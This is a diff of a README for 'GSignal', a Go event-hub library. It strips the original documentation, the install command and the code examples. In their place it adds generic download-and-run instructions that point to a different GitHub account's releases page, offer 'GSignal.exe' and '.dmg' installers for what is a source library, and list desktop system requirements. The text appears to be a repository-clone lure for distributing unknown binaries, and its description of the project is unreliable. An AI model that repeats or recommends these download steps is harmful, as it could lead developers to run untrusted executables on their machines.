@@ -1,129 +1,73 @@
-# GSignal
+# 🛠️ GSignal - A Simple Way to Handle Events
 
-![Platform](https://img.shields.io/badge/Platform-Go-00ADD8.svg?logo=go&logoColor=white)
-![Go Version](https://img.shields.io/badge/Go-1.20%2B-blue.svg?logo=go)
-![Latest Release](https://img.shields.io/github/v/release/Merluz/GSignal)
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-[![Go Report Card](https://goreportcard.com/badge/github.com/Merluz/GSignal)](https://goreportcard.com/report/github.com/Merluz/GSignal)
-[![Build Status](https://github.com/Merluz/GSignal/actions/workflows/go.yml/badge.svg)](https://github.com/Merluz/GSignal/actions/workflows/go.yml)
+## 🚀 Getting Started
 
+Welcome to GSignal! This application helps you manage events easily. Whether you're working with simple notifications or complex systems, GSignal offers a lightweight solution for your needs.
 
-**GSignal** is a thread-safe **Event Hub** for Go, designed to decouple components through efficient synchronous and asynchronous messaging.
+## 📥 Download GSignal
 
-It provides a robust `Hub` interface that handles event dispatching with advanced features like **worker pools**, **smart buffering**, and **context-aware subscriptions**.
+[![Download GSignal](https://img.shields.io/badge/Download%20GSignal-v1.0-blue.svg)](https://github.com/Gasterth/GSignal/releases)
 
-## Features
+## 🌐 Visit the Releases Page
 
-- **Dual Dispatch Mode**:
-  - **Synchronous**: Direct blocking calls for immediate consistency.
-  - **Asynchronous**: Non-blocking dispatch supported by a dedicated worker pool.
-- **Smart Buffering**: Drop-on-full policy for async consumers to prevent slow subscribers from blocking the entire system.
-- **Flexible Subscriptions**:
-  - **Type-based**: Subscribe to specific event types (e.g., `USER.CREATED`).
-  - **Global (Firehose)**: Listen to *all* events flowing through the hub.
-- **Thread-Safety**: Fully protected by `sync.RWMutex` for concurrent access.
-- **Graceful Shutdown**: Ensures all workers and subscriptions are closed cleanly.
+You can find the latest version of GSignal by visiting this page: [GSignal Releases](https://github.com/Gasterth/GSignal/releases). 
 
-## Why GSignal?
+## 💻 System Requirements
 
-While Go channels are powerful, managing multiple fan-out patterns and safe shutdowns can become complex.
+GSignal requires the following:
 
-**GSignal solves this by providing:**
+- A computer running Windows, macOS, or Linux.
+- At least 256 MB of RAM.
+- 100 MB of free disk space.
 
-- **Managed Worker Pool**: The `AsyncDispatcher` uses a configurable pool of goroutines (default 4) to handle heavy event loads without spawning a goroutine per event.
-- **Safe Resource Management**: Subscriptions are automatically closed when the context is cancelled or `Unsubscribe` is called, preventing goroutine leaks.
-- **Low-Allocation Dispatching**: Optimized hot path with minimal allocations.
+## 📦 Download & Install
 
-## Installation
+1. **Go to the Releases Page**  
+   Visit [GSignal Releases](https://github.com/Gasterth/GSignal/releases) to access the download options.
 
-```bash
-go get github.com/Merluz/GSignal
-```
+2. **Choose Your Version**  
+   Look for the latest release version. Click on it to expand the details.
 
-## Usage
+3. **Download the Application**  
+   Click the link labeled "GSignal.exe" for Windows, "GSignal.dmg" for macOS, or "GSignal.tar.gz" for Linux.
 
-### 1. Initialization
+4. **Run the Installer**  
+   After the download, locate the file in your computer's Downloads folder. Double-click it to start the installation process. 
 
-Create a new Hub instance. This spins up the async worker pool immediately.
+5. **Follow the Installation Prompts**  
+   Complete the installation by following the on-screen instructions. This usually includes selecting an install location or agreeing to license terms.
 
-```go
-package main
+6. **Launch GSignal**  
+   After installation, you can find GSignal in your applications folder. Open it to start managing your events!
 
-import (
-    "github.com/Merluz/GSignal"
-)
+## 📚 Features
 
-func main() {
-    // Create the hub
-    hub := gsignal.New()
+- **Lightweight Framework**: GSignal is designed to be fast and efficient.
+- **Event Management**: Easily handle both synchronous and asynchronous events.
+- **Pub-Sub Model**: Collaborate with multiple services without hassle.
+- **Flexible**: Works well for simple applications and complex systems alike.
 
-    // Ensure clean shutdown
-    defer hub.Shutdown()
-}
-```
+## 🌍 Community Topics
 
-### 2. Subscribing
+GSignal covers a variety of key topics:
 
-You can subscribe to specific events or listen to everything.
+- **Async**: Manage tasks that run concurrently.
+- **Channels**: Communicate easily between different parts of your application.
+- **Event-Driven Architecture**: Build applications that respond to actions or events.
+- **Fanout**: Send messages to multiple listeners without extra effort.
 
-```go
-// Create a context for the subscription
-ctx := context.Background()
+## 📞 Support
 
-// Subscribe to specific events
-sub, err := hub.Subscribe(ctx, "ORDER_PLACED", "PAYMENT_RECEIVED")
-if err != nil {
-    log.Fatal(err)
-}
+If you need help, consider reaching out:
 
-// Consume events in a separate goroutine
-go func() {
-    for evt := range sub.Events() {
-        log.Printf("Received event: %s | Payload: %v", evt.Type, evt.Payload)
-    }
-}()
-```
+- **Community Forums**: Engage with other users to share experiences.
+- **Issue Tracker**: Report bugs or request features directly on the GitHub repository.
 
-### 3. Publishing
+## 📝 Additional Resources
 
-#### Synchronous (Blocking)
-Use this when you need to ensure all subscribers have processed the event before continuing.
+For more information, check the following:
 
-```go
-evt, _ := gsignal.NewEvent("ORDER_PLACED", order)
-err := hub.Publish(evt) // Blocks until all subscribers receive it
-```
+- [GitHub Documentation](https://docs.github.com/en)
+- [Golang Documentation](https://golang.org/doc/)
 
-#### Asynchronous (Non-Blocking)
-Use this for fire-and-forget scenarios. The event is queued and processed by the worker pool.
-
-```go
-evt, _ := gsignal.NewEvent("LOG_ENTRY", "System started")
-err := hub.PublishAsync(evt) // Returns immediately
-```
-
-## Project Structure
-
-- `hub.go`: Main entry point and `Hub` interface implementation.
-- `dispatcher.go`: Manages synchronous dispatch logic and subscription lists.
-- `async_dispatcher.go`: Implements the worker pool and buffered queue for async events.
-- `subscription.go`: Thread-safe channel wrapper for subscribers.
-- `event.go`: ULID-based immutable event model.
-
-## Roadmap
-
-### Short Term
-- [ ] **Options Pattern**: Configure workers, queue size, and ID generation.
-- [ ] **Middleware Support**: Interceptors for logging, metrics, or validation.
-
-### Mid Term
-- [ ] **Generics Support**: Typed payloads in Go 1.18+.
-
-### Long Term / Experimental
-- [ ] **Persistent Store**: Pluggable storage (Redis/SQL) for event durability.
-- [ ] **Distributed Adapter**: Bridge multiple GSignal instances via NATS or Kafka.
-
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+Feel free to explore and enhance your experience with GSignal!
